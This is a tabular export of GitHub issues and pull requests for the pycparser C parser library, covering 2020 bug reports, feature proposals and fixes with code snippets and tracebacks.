eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/401,758757541,MDExOlB1bGxSZXF1ZXN0NTMzODc1NjA4,401,Extra line breaks when c_ast.If are chained,51960393,closed,FALSE,NA,NA,1,2020-12-07T18:50:28Z,2020-12-09T14:19:27Z,2020-12-09T13:51:25Z,CONTRIBUTOR,NA,"```
>>> from pycparser import c_ast, c_generator
>>> generator = c_generator.CGenerator()
>>> generator.visit(c_ast.If(None, None, c_ast.If(None, None, c_ast.If(None, None, None))))
'if ()\n  \nelse\n  if ()\n  \nelse\n  if ()\n  \n\n\n'
```

Multiple trailing line breaks appear at the end of the code (one per if statement) when no one should be there.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/401/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/401/comments,https://api.github.com/repos/eliben/pycparser/issues/401/events,https://github.com/eliben/pycparser/pull/401,https://api.github.com/repos/eliben/pycparser/pulls/401
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/400,758038443,MDExOlB1bGxSZXF1ZXN0NTMzMjc4MDE0,400,Simplify test execution,347634,closed,FALSE,NA,NA,3,2020-12-06T22:24:04Z,2020-12-08T14:48:59Z,2020-12-08T14:48:59Z,CONTRIBUTOR,NA,"Use the stdlib standard entry point for running tests through the
command:

    python -m unittest discover

Docs: https://docs.python.org/3/library/unittest.html#unittest-test-discovery

This automatically looks for files with the test_ prefix and runs them
as tests. This removes the need for the custom test entry point script,
all_tests.py.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/400/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/400/comments,https://api.github.com/repos/eliben/pycparser/issues/400/events,https://github.com/eliben/pycparser/pull/400,https://api.github.com/repos/eliben/pycparser/pulls/400
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/399,758035262,MDExOlB1bGxSZXF1ZXN0NTMzMjc1Njg3,399,Delete Travis configuration,347634,closed,FALSE,NA,NA,0,2020-12-06T22:07:16Z,2020-12-07T16:23:33Z,2020-12-07T16:23:33Z,CONTRIBUTOR,NA,The project now uses GitHub actions and Travis does not run.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/399/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/399/comments,https://api.github.com/repos/eliben/pycparser/issues/399/events,https://github.com/eliben/pycparser/pull/399,https://api.github.com/repos/eliben/pycparser/pulls/399
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/398,758034590,MDExOlB1bGxSZXF1ZXN0NTMzMjc1MTg5,398,Add testing and support for modern Pythons,347634,closed,FALSE,NA,NA,0,2020-12-06T22:04:30Z,2020-12-08T14:08:59Z,2020-12-08T14:08:07Z,CONTRIBUTOR,NA,"Python 3.9 was released on October 5th, 2020.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/398/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/398/comments,https://api.github.com/repos/eliben/pycparser/issues/398/events,https://github.com/eliben/pycparser/pull/398,https://api.github.com/repos/eliben/pycparser/pulls/398
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/397,745560132,MDU6SXNzdWU3NDU1NjAxMzI=,397,pycparser get an error when parse openssl/ssl/bio_ssl.c,32149596,closed,FALSE,NA,NA,2,2020-11-18T11:03:01Z,2021-02-27T00:26:48Z,2021-02-27T00:26:47Z,NONE,NA,"I want to parse this file https://github.com/openssl/openssl/blob/master/ssl/bio_ssl.c
First, I use command below to preprocess it because there are so many head files in openssl project.
```
gcc  -E -I. -Iinclude  -DAES_ASM -fPIC -pthread -m64 -Wa,--noexecstack -Wall -DOPENSSL_USE_NODELETE -DL_ENDIAN -DOPENSSL_PIC -DOPENSSLDIR=""\""/usr/local/ssl\"""" -DENGINESDIR=""\""/usr/local/lib/engines-3\"""" -DMODULESDIR=""\""/usr/local/lib/ossl-modules\"""" -DOPENSSL_BUILDING_OPENSSL -DNDEBUG  -MMD -MF ssl/libssl-lib-bio_ssl.d.tmp -MT ssl/libssl-lib-bio_ssl.o -c  ssl/bio_ssl.c > bio_ssl_pp.c
```
Then I get `bio_ssl_pp.c` 
[bio_ssl_pp.c.zip](https://github.com/eliben/pycparser/files/5559511/bio_ssl_pp.c.zip), and I parse it with code below.
```
from __future__ import print_function
import sys

from pycparser import c_parser, c_ast, parse_file

if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        filename  = sys.argv[1]
    else:
        exit(0)
    ast = parse_file(filename)
```
Finally, I get error log like this. Can you help me with it?
```
Traceback (most recent call last):
  File ""exp.py"", line 11, in <module>
    ast = parse_file(filename)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/__init__.py"", line 90, in parse_file
    return parser.parse(text, filename)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/c_parser.py"", line 1861, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python3.5/dist-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/lib/gcc/x86_64-linux-gnu/5/include/stdarg.h:40:27: before: __gnuc_va_list
```


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/397/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/397/comments,https://api.github.com/repos/eliben/pycparser/issues/397/events,https://github.com/eliben/pycparser/issues/397,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/396,734700544,MDU6SXNzdWU3MzQ3MDA1NDQ=,396,Full source code?,17355512,closed,FALSE,NA,NA,2,2020-11-02T17:45:17Z,2020-11-02T22:29:21Z,2020-11-02T22:29:21Z,NONE,NA,"Although the code is kinda open source, most of it seems to be autogenerated by `yacc`, and therefore is not ""source code"", as per the FSF definition. Is it possible to see the real source of it?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/396/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/396/comments,https://api.github.com/repos/eliben/pycparser/issues/396/events,https://github.com/eliben/pycparser/issues/396,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/395,713903969,MDU6SXNzdWU3MTM5MDM5Njk=,395,"Regenerate function body, and grab AST for specific function",13770901,open,FALSE,NA,NA,0,2020-10-02T21:09:32Z,2020-10-02T21:09:32Z,NA,NONE,NA,"When parsing a C file, I'd like to be able to regenerate the function body for a given function, and get the AST for specifically that function. e.g., `example0.c`
```
#include something.h 

void my_example() {
  int data = rand();
  printIntLine(data);
}

int main(int argc, char * argv[]) {
  my_example();
}
```

I've been attempting to modify `func_defs.py`. Current code as follows. I need assistance with `func_ast` and `func_body`
```
import pandas as pd

sys.path.extend(['.', '..'])

from pycparser import c_parser, c_ast, parse_file

function_list = []

# A simple visitor for FuncDef nodes that prints the names and
# locations of function definitions.
class FuncDefVisitor(c_ast.NodeVisitor):
    def visit_FuncDef(self, node):
        func_name = str(node.decl.name)
        coord = str(node.decl.coord)

        # if the function name contains the word ""example"" add it to the list
        if re.search(""example"", func_name):
            func_ast = the ast for this function   # need help here
            func_body = str(the function body) # need help here
            function_list.append([func_name, coord, function_ast, function_body])
        else: 
            pass


def show_func_defs(filename):
    ast = parse_file(filename,
                    use_cpp=True,
                    cpp_path='clang',
                    cpp_args=['-E', '-I/utils/fake_libc_include'])

    v = FuncDefVisitor()
    v.visit(ast)


if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        filename  = sys.argv[1]
    else:
        dir = '/Users/me/my_c_examples'
        for filename in glob.iglob(dir + ""*/*/*.c"", recursive=True):
            try:
                show_func_defs(filename)
            except:
                print(""Check  out: "", filename)
                pass

    print(function_list)
    df = pd.DataFrame(function_list, columns=['func_name', 'func_coord', 'func_ast', 'func_body'])
    df.to_csv('my_example_functions_ast.csv')
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/395/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/395/comments,https://api.github.com/repos/eliben/pycparser/issues/395/events,https://github.com/eliben/pycparser/issues/395,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/394,713032251,MDExOlB1bGxSZXF1ZXN0NDk2NDE3OTU4,394,Added flattening of abundant parenthesis in CGenerator,1473799,closed,FALSE,NA,NA,3,2020-10-01T17:17:55Z,2020-10-05T13:27:25Z,2020-10-05T13:27:25Z,CONTRIBUTOR,NA,"Use with `CGenerator(flatten=True)`:
```python
>>> from pycparser import CParser
>>> from pycparser.c_generator import CGenerator
>>>
>>> ast = CParser().parse('int x = a+b+c*d;')
__main__:264: DeprecationWarning: 'U' mode is deprecated
>>> CGenerator().visit(ast)
'int x = (a + b) + (c * d);\n'
>>> CGenerator(flatten=True).visit(ast)
'int x = a + b + c * d;\n'
>>>
```


Fixes #393.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/394/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/394/comments,https://api.github.com/repos/eliben/pycparser/issues/394/events,https://github.com/eliben/pycparser/pull/394,https://api.github.com/repos/eliben/pycparser/pulls/394
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/393,712570537,MDU6SXNzdWU3MTI1NzA1Mzc=,393,Precedence-aware CGenerator,1473799,closed,FALSE,NA,NA,1,2020-10-01T07:23:06Z,2020-10-05T13:27:25Z,2020-10-05T13:27:25Z,CONTRIBUTOR,NA,"I ran into the issue that in a code more than 256 variables are summed up. The `CGenerator` turned this into >256 nested BinaryOperators with that many parenthesis, that in turn was something clang did not like (be default).

I wrote a small generator which takes precedence into account for binary operators:

```python
class LessParanthesizingCGenerator(CGenerator):
    def get_BinaryOp_precedence(self, n):
        """"""
        Gives precedence for op of n, otherwise -1.
        
        Lower number have precedence over higher numbers.
        """"""
        binary_op_precedence = {
            # based on https://en.cppreference.com/w/c/language/operator_precedence
            '*': 3, '%': 3,
            '-': 4, '+': 4,
            '<<': 5, '>>': 5,
            '<': 6, '<=': 6, '>': 6, '>=': 6,
            '==': 7, '!=': 7,
            '&': 8,
            '^': 9,
            '|': 10,
            '&&': 11,
            '||': 12
        }
        if not isinstance(n, c_ast.BinaryOp):
            return -1
        else:
            return binary_op_precedence[n.op]

    def visit_BinaryOp(self, n):
        p = self.get_BinaryOp_precedence(n)
        lval_str = self._parenthesize_if(n.left,
                            lambda d: not self._is_simple_node(d) and 
                                      self.get_BinaryOp_precedence(d) > p)
        rval_str = self._parenthesize_if(n.right,
                            lambda d: not self._is_simple_node(d) and
                                      self.get_BinaryOp_precedence(d) >= p)
        return '%s %s %s' % (lval_str, n.op, rval_str)
```

Would you like me to make a pull request and if so, is this implementation sufficient for now? Tests I would of cause add.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/393/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/393/comments,https://api.github.com/repos/eliben/pycparser/issues/393/events,https://github.com/eliben/pycparser/issues/393,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/392,711911918,MDU6SXNzdWU3MTE5MTE5MTg=,392,Escapes in unified string literals,1742914,open,FALSE,NA,NA,1,2020-09-30T12:40:34Z,2020-09-30T13:48:49Z,NA,NONE,NA,"``C_Parser.p_unified_string_literal()`` shows a potential issue: in C, the two string literals ``""\123""`` and ``""\1"" ""23""`` are different.  In the first case, it is a single character ``S``; in the second case, it is three characters, the first one of which has got ord == 1.  But pycparser reports the same for both cases, namely the 6-character string ``""\123""``.  This is due to ``p_unified_string_literal()`` that concatenates the unprocessed strings and removes the two ``""`` characters in the middle.  The program using pycparser cannot distinguish the two cases any more.

I'm not sure how this problem should be fixed.  Maybe one way is for pycparser to actually process the strings (e.g. in a new attribute of the Constant object), which can then meaningfully be concatenated in all cases.  Another way would be to add a list of strings on the Constant, to remember the original divisions.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/392/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/392/comments,https://api.github.com/repos/eliben/pycparser/issues/392/events,https://github.com/eliben/pycparser/issues/392,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/391,706481414,MDExOlB1bGxSZXF1ZXN0NDkxMDIwNjAy,391,Add multi-OS setup for github actions,1130906,closed,FALSE,NA,NA,0,2020-09-22T15:24:27Z,2020-09-22T15:35:16Z,2020-09-22T15:35:16Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/391/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/391/comments,https://api.github.com/repos/eliben/pycparser/issues/391/events,https://github.com/eliben/pycparser/pull/391,https://api.github.com/repos/eliben/pycparser/pulls/391
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/390,693045566,MDExOlB1bGxSZXF1ZXN0NDc5NTc2OTY1,390,Adding ppc64le architecutre,68464660,closed,FALSE,NA,NA,5,2020-09-04T10:59:44Z,2020-09-22T15:58:31Z,2020-09-22T15:36:13Z,NONE,NA,"Hi,
I had added ppc64le support and looks like its been successfully added. I believe it is ready for the final review and merge.

The travis-ci build logs can be verified from the link below.
https://www.travis-ci.com/github/kishorkunal-raj/pycparser/builds/182741818
Please have a look.

Thanks!!""",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/390/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/390/comments,https://api.github.com/repos/eliben/pycparser/issues/390/events,https://github.com/eliben/pycparser/pull/390,https://api.github.com/repos/eliben/pycparser/pulls/390
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/389,681041967,MDExOlB1bGxSZXF1ZXN0NDY5NDk4Nzkz,389,Fix issue #349 use raw strings in lexer tests,2493157,closed,FALSE,NA,NA,0,2020-08-18T13:28:11Z,2020-08-18T15:22:04Z,2020-08-18T15:22:03Z,CONTRIBUTOR,NA,Closes #349.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/389/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/389/comments,https://api.github.com/repos/eliben/pycparser/issues/389/events,https://github.com/eliben/pycparser/pull/389,https://api.github.com/repos/eliben/pycparser/pulls/389
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/388,667612898,MDU6SXNzdWU2Njc2MTI4OTg=,388,How to get functions but not in structs?,204496,closed,FALSE,NA,NA,2,2020-07-29T07:19:56Z,2020-07-30T07:43:12Z,2020-07-30T07:43:12Z,CONTRIBUTOR,NA,"I want to find function definitions/declarations but avoid anything that is not a ""top level"" function, including struct fields that are pointers to functions:

    struct {
        void (*func)();
    };

A straight forward approach with `FuncDefVisitor()` does not work since it is impossible to see if the visited node is inside a struct.

Looping over all nodes on top level feels like re-implementing the visiting dispatch logic.

Is there an easier way?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/388/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/388/comments,https://api.github.com/repos/eliben/pycparser/issues/388/events,https://github.com/eliben/pycparser/issues/388,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/387,659732220,MDExOlB1bGxSZXF1ZXN0NDUxNTQ1OTc3,387,"Fix issues #378, #379, #385",5766101,closed,FALSE,NA,NA,1,2020-07-17T23:27:47Z,2020-07-18T15:42:55Z,2020-07-18T12:48:32Z,CONTRIBUTOR,NA,"This PR address the following issues:

- #378: Replace assertion inside `CParser` with check that raises `ParseError` on failure.
  **What's changed:** Only the assertion inside `_build_function_definition` is replaced. The assertion is not appropriate because there are possible inputs (although grammatically incorrect) that would trigger the assertion.
- #379: Fix exception when parsing `struct` with nested `enum`.
  **What's changed:** `Enum` is also added to the list of node types that are handled differently inside `CParser._build_declarations` (the others being `Struct`, `Union`, and `IdentifierType`).
- #385: Fix exponential time cost when generating code with nested `sizeof`s.
  **What's changed:** Simple fix in `CGenerator`.

New test cases are added to cover the changes.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/387/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/387/comments,https://api.github.com/repos/eliben/pycparser/issues/387/events,https://github.com/eliben/pycparser/pull/387,https://api.github.com/repos/eliben/pycparser/pulls/387
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/386,657163153,MDExOlB1bGxSZXF1ZXN0NDQ5MzI3MzIx,386,Use context manager for reading data from file,58348955,closed,FALSE,NA,NA,0,2020-07-15T08:25:37Z,2020-07-18T12:34:30Z,2020-07-18T12:34:30Z,NONE,NA,Forgetting to close the file triggers ResourceWarnings. Breaking out the try statement prevents any exceptions from being hidden from the user,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/386/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/386/comments,https://api.github.com/repos/eliben/pycparser/issues/386/events,https://github.com/eliben/pycparser/pull/386,https://api.github.com/repos/eliben/pycparser/pulls/386
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/385,655285655,MDU6SXNzdWU2NTUyODU2NTU=,385,Exponential time complexity when generating code from AST with nested `sizeof`s.,5766101,closed,FALSE,NA,NA,1,2020-07-11T21:52:01Z,2020-07-18T12:48:34Z,2020-07-18T12:48:34Z,CONTRIBUTOR,NA,"Minimum example to reproduce:
```python
from pycparser.c_parser import CParser
from pycparser.c_generator import CGenerator

# Code is 30 nested `sizeof`s.
code = ""int x = sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(sizeof(int))))))))))))))))))))))))))))));""
tree = CParser().parse(code)
print(tree)  # the tree is correct
print(CGenerator().visit(tree))  # this never stops
```

The issue is within `CGenerator.visit_UnaryOp`:
https://github.com/eliben/pycparser/blob/61eac63fda12f9ba4504def70d0d76cd3ac1bbff/pycparser/c_generator.py#L61-L72
In the case where `n.op` is `sizeof`, `n.expr` is visited twice. When there are nested `sizeof`s, the leaf nodes will be visited an exponential number of times. (Although in reality such code wouldn't make sense)

I can create a PR with a few of my previous issues, but it might take a few days before I can work on this.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/385/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/385/comments,https://api.github.com/repos/eliben/pycparser/issues/385/events,https://github.com/eliben/pycparser/issues/385,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/384,648707390,MDU6SXNzdWU2NDg3MDczOTA=,384,Parse failed with Comment and UnicodeDecodeError,26370840,closed,FALSE,NA,NA,4,2020-07-01T06:21:21Z,2020-11-20T14:39:37Z,2020-11-20T14:39:37Z,NONE,NA,"I found i could not set encoding in parse_file which cause UnicodeDecodeError


Use this remove comment  https://stackoverflow.com/a/2319116
```python
def removeComments(string):
    string = re.sub(re.compile(""/\*.*?\*/"",re.DOTALL ) ,"""" ,string) # remove all occurrences streamed comments (/*COMMENT */) from string
    string = re.sub(re.compile(""//.*?\n"" ) ,"""" ,string) # remove all occurrence single-line comments (//COMMENT\n ) from string
    return string
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/384/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/384/comments,https://api.github.com/repos/eliben/pycparser/issues/384/events,https://github.com/eliben/pycparser/issues/384,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/383,644813540,MDU6SXNzdWU2NDQ4MTM1NDA=,383,c_ast.Node subclasses don't call __init__ on node,10335942,closed,FALSE,NA,NA,2,2020-06-24T18:10:41Z,2020-06-30T01:58:38Z,2020-06-30T01:58:38Z,NONE,NA,"I am trying to use this library to find certain function calls and find the type of argument.
To do this, I have gone the route of trying to add a parent to each node dynamically, by overriding the `generic_visit` method of `c_ast.NodeVisitor`. However, overriding `c_ast.Node`'s `__init__` function to create a `self.parent` attribute doesn't work since none of `c_ast.Node`'s subclasses call `super().__init__`.

Would it be reasonable to accept a PR that fixes this?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/383/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/383/comments,https://api.github.com/repos/eliben/pycparser/issues/383/events,https://github.com/eliben/pycparser/issues/383,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/382,643473200,MDU6SXNzdWU2NDM0NzMyMDA=,382,AttributeError: 'Constant' object has no attribute 'name',1065860,closed,FALSE,NA,NA,2,2020-06-23T02:08:27Z,2020-06-29T23:49:42Z,2020-06-29T23:49:42Z,NONE,NA,"I've written a test script that's almost identical to func_defs.py, but when I run it, I get this error:

  File ""/home/ttabi/sw/pvt/ttabi/boardobj.py"", line 29, in visit_FuncCall
    if node.name.name == self.funcname:
AttributeError: 'Constant' object has no attribute 'name'

I just copied visit_FuncCall verbatim.  I think the API has changed since this example was written, but I don't know Python well enough to debug this.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/382/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/382/comments,https://api.github.com/repos/eliben/pycparser/issues/382/events,https://github.com/eliben/pycparser/issues/382,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/381,640759443,MDU6SXNzdWU2NDA3NTk0NDM=,381,Error When Parsing Typdef Function Pointer,9311230,closed,FALSE,NA,NA,1,2020-06-17T21:40:11Z,2020-06-23T04:36:33Z,2020-06-23T04:36:33Z,NONE,NA,"The following one-statement header file does not parse:

```
typedef
  void (*func_pointer_t)(
    const void * ,
    size_t ,
    const void * ,
    size_t );
```

It raises the exception: `pycparser.plyparser.ParseError: <stdin>:4:5: before: size_t`

Here is a backtrace:

```
File ""/lib/python3.7/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/lib/python3.7/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/lib/python3.7/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/lib/python3.7/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/lib/python3.7/site-packages/pycparser/c_parser.py"", line 1848, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/lib/python3.7/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/381/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/381/comments,https://api.github.com/repos/eliben/pycparser/issues/381/events,https://github.com/eliben/pycparser/issues/381,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/380,625363135,MDU6SXNzdWU2MjUzNjMxMzU=,380,"""typedef int  __int128;"" Fails with ParseError: Invalid Declaration",5795220,closed,FALSE,NA,NA,3,2020-05-27T04:17:07Z,2020-05-27T15:51:27Z,2020-05-27T12:20:58Z,NONE,NA,"Seems very specific to the number 128 and double underscore; haven't been able to reproduce with any other example.

Traceback:
```
>>> p.parse(""typedef int  __int128;"")
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py"", line 1118, in parseopt_notrack
    p.callable(pslice)
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py"", line 715, in p_decl_body
    typedef_namespace=True)
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py"", line 402, in _build_declarations
    self._parse_error('Invalid declaration', coord)
  File ""/usr/local/Cellar/python3/3.7.7/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: :1:9: Invalid declaration
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/380/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/380/comments,https://api.github.com/repos/eliben/pycparser/issues/380/events,https://github.com/eliben/pycparser/issues/380,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/379,625305329,MDU6SXNzdWU2MjUzMDUzMjk=,379,`AttributeError` when parsing `struct` with nested `enum`,5766101,closed,FALSE,NA,NA,1,2020-05-27T01:24:32Z,2020-07-18T12:48:34Z,2020-07-18T12:48:34Z,CONTRIBUTOR,NA,"When parsing the following code:
```c
typedef struct {
  enum {
    A = 1
  };
} foo;
```
The following exception is raised:
```python
~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in parse(self, text, filename, debuglevel)
    150                 input=text,
    151                 lexer=self.clex,
--> 152                 debug=debuglevel)
    153
    154     ######################--   PRIVATE   --######################

~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py in parse(self, input, lexer, debug, tracking, tokenfunc)
    329             return self.parseopt(input, lexer, debug, tracking, tokenfunc)
    330         else:
--> 331             return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
    332
    333

~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/ply/yacc.py in parseopt_notrack(self, input, lexer, debug, tracking, tokenfunc)
   1116                             del symstack[-plen:]
   1117                             self.state = state
-> 1118                             p.callable(pslice)
   1119                             del statestack[-plen:]
   1120                             symstack.append(sym)

~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in p_struct_declaration_1(self, p)
    993             decls = self._build_declarations(
    994                 spec=spec,
--> 995                 decls=[dict(decl=decl_type)])
    996
    997         else:

~/.pyenv/versions/3.7.2/Python.framework/Versions/3.7/lib/python3.7/site-packages/pycparser/c_parser.py in _build_declarations(self, spec, decls, typedef_namespace)
    418             decls_0_tail = decls[0]['decl']
    419             while not isinstance(decls_0_tail, c_ast.TypeDecl):
--> 420                 decls_0_tail = decls_0_tail.type
    421             if decls_0_tail.declname is None:
    422                 decls_0_tail.declname = spec['type'][-1].names[0]

AttributeError: 'Enum' object has no attribute 'type'
```

Not sure if the code is standard-conforming, but in any case an `AttributeError` should not be thrown.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/379/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/379/comments,https://api.github.com/repos/eliben/pycparser/issues/379/events,https://github.com/eliben/pycparser/issues/379,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/378,625059243,MDU6SXNzdWU2MjUwNTkyNDM=,378,Replace assertions with checks that raise `ParseError`s,5766101,closed,FALSE,NA,NA,2,2020-05-26T17:35:18Z,2020-07-18T12:48:34Z,2020-07-18T12:48:34Z,CONTRIBUTOR,NA,"https://github.com/eliben/pycparser/blob/61eac63fda12f9ba4504def70d0d76cd3ac1bbff/pycparser/c_parser.py#L464-L467

In this and other lines of `c_parser.py`, assertions are used to verify that said condition is true. However, there can be input that will result in the condition being false. For example, the following code triggers an `AssertionError` at the line above:
```c
typedef struct __attribute__((packed)) {
    char name[36];
    int attr;
} foo;
```
I would argue that the desired behavior here is to be consistent and throw a `ParseError` instead.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/378/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/378/comments,https://api.github.com/repos/eliben/pycparser/issues/378/events,https://github.com/eliben/pycparser/issues/378,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/377,624526461,MDU6SXNzdWU2MjQ1MjY0NjE=,377,typedef function for pointer define as FuncDecl,37955368,closed,FALSE,NA,NA,1,2020-05-26T00:03:06Z,2020-05-26T00:28:27Z,2020-05-26T00:28:27Z,NONE,NA,"Hi,

I have a pointer to function
```c
#ifndef SIGNALHANDLER_H_
#define SIGNALHANDLER_H_

typedef void (*SignalHandler)(int signum);

